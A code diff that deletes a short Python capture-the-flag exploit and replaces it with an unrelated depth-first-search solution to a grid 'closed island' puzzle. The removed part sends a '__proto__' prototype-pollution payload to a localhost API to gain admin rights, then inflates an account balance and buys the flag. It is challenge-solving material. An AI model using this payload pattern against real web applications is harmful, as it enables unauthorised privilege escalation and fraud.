@@ -1,39 +1,46 @@
-import requests
-
-base_url = "http://localhost:3000/api/v1"
+from typing import List
 
 
-def become_admin():
-    param1 = {
-        "__proto__": {
-            "admin": True
-        }
-    }
-    res = requests.post(f"{base_url}/sell", json=param1, headers={"Content-Type": "application/json"})
+class Solution:
+    def closedIsland(self, grid: List[List[int]]) -> int:
+        # 1. init
+        res = 0
+        n, m = len(grid), len(grid[0])
+        visited = [[False] * m for _ in range(n)]
+        d = [(0, -1), (0, 1), (1, 0), (-1, 0)]
 
-    return res.headers['set-cookie'].split("; ")[0]
+        # 2. dfs
+        def dfs(x, y):
+            visited[x][y] = True
 
+            for dx, dy in d:
+                nx, ny = x + dx, y + dy
+                if nx < 0 or nx >= n or ny < 0 or ny >= m:
+                    continue
+                if grid[nx][ny] != 0 or visited[nx][ny]:
+                    continue
+                dfs(nx, ny)
 
-def get_money(cookie):
-    param2 = {
-        "money": 2.5e25
-    }
-    res = requests.post(f"{base_url}/money", json=param2, headers={"Cookie": cookie, "Content-Type": "application/json"})
+        # 3. edge
+        for i in range(n):
+            for j in range(m):
+                if i == 0 or i == n - 1 or j == 0 or j == m - 1:
+                    if grid[i][j] == 0 and not visited[i][j]:
+                        dfs(i, j)
 
+        # 4. center
+        for i in range(1, n-1):
+            for j in range(1, m-1):
+                if grid[i][j] == 0 and not visited[i][j]:
+                    dfs(i, j)
+                    res += 1
 
-def buy_flag(cookie):
-    param3 = {
-        "fruit": "grass",
-        "quantity": 1
-    }
-    res = requests.post(f"{base_url}/buy", json=param3, headers={"Cookie": cookie, "Content-Type": "application/json"})
-    return res.text
+        return res
 
+# grid = [[1,1,1,1,1,1,1,0],[1,0,0,0,0,1,1,0],[1,0,1,0,1,1,1,0],[1,0,0,0,0,1,0,1],[1,1,1,1,1,1,1,0]]
+# grid = [[0,0,1,0,0],[0,1,0,1,0],[0,1,1,1,0]]
+grid = [[0,0,1,1,0,1,0,0,1,0],[1,1,0,1,1,0,1,1,1,0],[1,0,1,1,1,0,0,1,1,0],[0,1,1,0,0,0,0,1,0,1],[0,0,0,0,0,0,1,1,1,0],[0,1,0,1,0,1,0,1,1,1],[1,0,1,0,1,1,0,0,0,1],[1,1,1,1,1,1,0,0,0,0],[1,1,1,0,0,1,0,1,0,1],[1,1,1,0,1,1,0,1,1,0]]
 
-def main():
-    cookie = become_admin()
-    get_money(cookie)
-    flag = buy_flag(cookie)
-    print(flag)
-
-main()
+sl = Solution()
+res = sl.closedIsland(grid)
+print('res', res)
